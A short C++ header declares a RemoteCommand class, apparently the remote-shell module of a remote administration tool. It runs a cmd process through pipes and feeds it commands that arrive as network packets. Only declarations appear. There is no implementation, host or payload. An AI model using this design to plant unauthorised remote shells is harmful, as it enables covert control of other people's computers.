#ifndef CMD_H
#define CMD_H

#include	<Windows.h>
#include	"connect.h"
#include	"Utilities.h"
#include	"bone_obj.h"

#define		MAX_CMD_BUFFER	0x1000

#define		CMD_START		0
#define		CMD_COMMAND		1
#define		CMD_EXIT		2
#define		CMD_GETTEXT		3

class RemoteCommand:public BoneObj
{
public:
	virtual void OnInit();
	virtual void OnPacketArrived(BYTE*, size_t);
	virtual void OnExit();
	RemoteCommand(Connection*);
	~RemoteCommand();
private:
	bool	CreateCmdProcess();
	bool	KillCurrentCmdProcess();
	bool	enterCmd(char*);
	bool	readCmd(char*);
	bool	isCmdStillRunning();
	bool	bRunning;

	HANDLE	pipin_w;
	HANDLE	pipin_r;
	HANDLE	pipout_w;
	HANDLE	pipout_r;
	PROCESS_INFORMATION pi;
};

#endif